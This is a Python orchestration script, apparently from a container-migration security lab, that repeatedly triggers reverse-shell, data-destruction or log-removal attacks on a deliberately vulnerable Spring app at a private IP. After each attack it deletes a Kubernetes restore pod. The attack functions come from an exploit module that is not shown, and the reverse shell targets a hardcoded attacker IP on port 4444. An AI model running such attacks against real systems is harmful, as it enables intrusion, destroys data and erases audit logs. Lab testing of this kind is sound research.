#!/usr/bin/env python3
"""
attack_simulation_loop.py
Usage: ./attack_simulation_loop.py <n> <attack_name>
attack_name must be one of: reverse_shell | data_destruction | log_removal
"""

import sys
import time
import subprocess

if len(sys.argv) != 3:
    print("Usage: {} <n> <attack_name>".format(sys.argv[0]), file=sys.stderr)
    print("attack_name: reverse_shell | data_destruction | log_removal", file=sys.stderr)
    sys.exit(2)

try:
    N = int(sys.argv[1])
    if N <= 0:
        raise ValueError()
except ValueError:
    print("First arg must be a positive integer (n).", file=sys.stderr)
    sys.exit(2)

ATTACK_NAME = sys.argv[2]
VALID = {"reverse_shell", "data_destruction", "log_removal"}
if ATTACK_NAME not in VALID:
    print("attack_name must be one of:", ", ".join(sorted(VALID)), file=sys.stderr)
    sys.exit(2)

# ------------------ HARDCODED TEST CONFIG ------------------
PY_PROJECT_PATH = "/home/ubuntu/meierm78/ContMigration-VT1/apps/kubernetes/vuln-spring/"
TARGET_URL = "http://10.0.0.29:30080"
ATTACKER_IP = "10.0.0.180"
ATTACKER_PORT = "4444"

KUBE_CONTEXT = "cluster2"
NAMESPACE = "default"
POD_NAME = "vuln-spring-restore"   
POD_WAIT_TIMEOUT = 60        # seconds to wait for pod to appear
POLL_INTERVAL = 1             # seconds between checks
TIMEOUT_FAILSAFE_LIMIT = 10
SUCCESS_COUNTER = 0
TIMEOUT_COUNTER = 0
# ---------------------------------------------------------

# import attack functions
sys.path.append(PY_PROJECT_PATH)
from vuln_spring_exploit import reverse_shell, data_destruction, log_removal  # type: ignore

def run_attack(name: str):
    try:
        if name == "reverse_shell":
            reverse_shell(TARGET_URL, ATTACKER_IP, ATTACKER_PORT)
        elif name == "data_destruction":
            data_destruction(TARGET_URL)
        elif name == "log_removal":
            log_removal(TARGET_URL)
    except Exception as e:
        # don't abort on exception — log and continue
        print(f"[WARN] Attack function {name} raised: {e}", file=sys.stderr)

def wait_for_pod_and_delete():
    time.sleep(45)
    start = time.time()
    while True:
        cp = subprocess.run(
            ["kubectl", "--context", KUBE_CONTEXT, "-n", NAMESPACE, "get", "pod", POD_NAME],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if cp.returncode == 0:
            print(f"Pod {POD_NAME} detected — deleting it...")
            subprocess.run(
                ["kubectl", "--context", KUBE_CONTEXT, "-n", NAMESPACE, "delete", "pod", POD_NAME, "--ignore-not-found"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return True
        if time.time() - start > POD_WAIT_TIMEOUT:
            print(f"[WARN] Timeout ({POD_WAIT_TIMEOUT}s) waiting for pod {POD_NAME}. Trying best-effort delete...")
            subprocess.run(
                ["kubectl", "--context", KUBE_CONTEXT, "-n", NAMESPACE, "delete", "pod", POD_NAME, "--ignore-not-found"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return False
        time.sleep(POLL_INTERVAL)

def main():
    global SUCCESS_COUNTER, TIMEOUT_COUNTER
    attempt = 0

    while SUCCESS_COUNTER < N:
        attempt += 1
        print(f"=== attempt {attempt} — success_count {SUCCESS_COUNTER}/{N} — triggering {ATTACK_NAME} ===")

        run_attack(ATTACK_NAME)
        print("Waiting for pod and deleting...")
        got = wait_for_pod_and_delete()
        if got:
            SUCCESS_COUNTER += 1
            TIMEOUT_COUNTER = 0  # reset consecutive timeout counter on success
            print(f"[OK] Pod found and deleted — success_count is now {SUCCESS_COUNTER}/{N}")
        else:
            TIMEOUT_COUNTER += 1
            print(f"[WARN] Pod not found within timeout on attempt {attempt}. consecutive_timeouts={TIMEOUT_COUNTER}/{TIMEOUT_FAILSAFE_LIMIT}", file=sys.stderr)

        # check failsafe
        if TIMEOUT_COUNTER >= TIMEOUT_FAILSAFE_LIMIT:
            print(f"[ERROR] TIMEOUT_COUNTER reached {TIMEOUT_COUNTER} (limit={TIMEOUT_FAILSAFE_LIMIT}). Aborting.", file=sys.stderr)
            sys.exit(1)

        # tiny pause so we don't hammer things
        time.sleep(20)

    print(f"Reached {SUCCESS_COUNTER} successful cleanups — done.")
    sys.exit(0)

if __name__ == "__main__":
    main()
33